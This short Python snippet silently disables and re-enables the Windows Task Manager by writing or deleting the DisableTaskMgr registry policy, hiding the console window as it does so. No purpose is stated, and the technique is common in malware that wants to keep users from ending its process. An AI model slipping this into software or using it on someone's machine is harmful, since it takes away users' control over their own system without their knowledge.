import subprocess
def notask():
 try:
  subprocess.run(["reg","add",r"HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System","/v","DisableTaskMgr","/t","REG_DWORD","/d","1","/f"],check=True,shell=True,creationflags=subprocess.CREATE_NO_WINDOW)
 except subprocess.CalledProcessError as e:
  if e.returncode==1:return
def yestask():
 try:
  subprocess.run(["reg","delete",r"HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System","/v","DisableTaskMgr","/f"],check=True,shell=True,creationflags=subprocess.CREATE_NO_WINDOW)
 except subprocess.CalledProcessError as e:
  if e.returncode==1:return